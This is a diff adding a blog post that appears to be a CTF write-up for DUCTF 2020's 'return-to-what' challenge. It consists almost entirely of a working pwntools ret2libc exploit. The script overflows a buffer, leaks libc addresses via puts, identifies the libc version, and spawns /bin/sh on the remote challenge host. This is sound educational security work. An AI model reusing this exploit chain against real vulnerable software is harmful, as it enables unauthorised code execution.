@@ -1,0 +1,102 @@
+export const meta = {
+  title: "return-to-what (DUCTF)",
+  description: "DUCTF",
+  date: "September 21, 2020",
+};
+
+import styles from "../../../styles/post.module.css";
+
+<div className={styles.post}>
+
+
+# return-to-what (DUCTF)
+
+###### September 21, 2020
+
+Unknown libc version. Leaked multiple addresses of libc functions. Offsets between functions were used to identify the correct libc version, using libc.rip.
+
+<div className={styles.codeblock}>
+
+
+```
+from pwn import *
+
+# local
+#target = process('./return-to-what')
+#libc = ELF('/usr/lib/libc.so.6')
+
+# remote nc chal.duc.tf 30003
+target = remote('chal.duc.tf', 30003)
+libc = ELF('libc-2.27.so') # identified using libc.rip
+
+pop_rdi = 0x40122b
+got_puts = 0x404018
+got_gets = 0x404020
+got_libc_start_main = 0x403ff0
+plt_puts = 0x401030
+ret = 0x401016
+start = 0x401060
+
+payload = b''
+payload += b'A'*56
+payload += p64(pop_rdi)
+payload += p64(got_puts) # leak addr
+payload += p64(plt_puts) # print address of puts in libc
+payload += p64(start) # restart
+
+target.recv() # Where would you like to return to?
+target.sendline(payload)
+
+libc_puts = int.from_bytes((target.recvuntil(b'\\n')[:-1]), byteorder='little')
+print('puts: ' + hex(libc_puts))
+
+payload = b''
+payload += b'A'*56
+payload += p64(pop_rdi)
+payload += p64(got_gets) # leak addr
+payload += p64(plt_puts) # print address of puts in libc
+payload += p64(start) # restart
+
+target.recv() # Where would you like to return to?
+target.sendline(payload)
+
+libc_gets = int.from_bytes((target.recvuntil(b'\\n')[:-1]), byteorder='little')
+print('gets: ' + hex(libc_gets))
+
+payload = b''
+payload += b'A'*56
+payload += p64(pop_rdi)
+payload += p64(got_libc_start_main) # leak addr
+payload += p64(plt_puts) # print address of puts in libc
+payload += p64(start) # restart
+
+target.recv() # Where would you like to return to?
+target.sendline(payload)
+
+start = int.from_bytes((target.recvuntil(b'\\n')[:-1]), byteorder='little')
+print('__libc_start_main: ' + hex(start))
+
+# Use https://libc.rip/ to identify libc version
+# libc.rip identified libc version as libc6_2.27-3ubuntu1_amd64
+
+
+libc.address = libc_puts - libc.symbols['puts']
+print('libc puts' + hex(libc.symbols['puts']))
+
+bin_sh = next(libc.search(b'/bin/sh'))
+libc_system = libc.symbols['system']
+
+payload = b''
+payload += b'A' * 56
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(ret)
+payload += p64(libc_system)
+
+target.sendline(payload)
+target.interactive()
+```
+
+</div>
+
+</div>
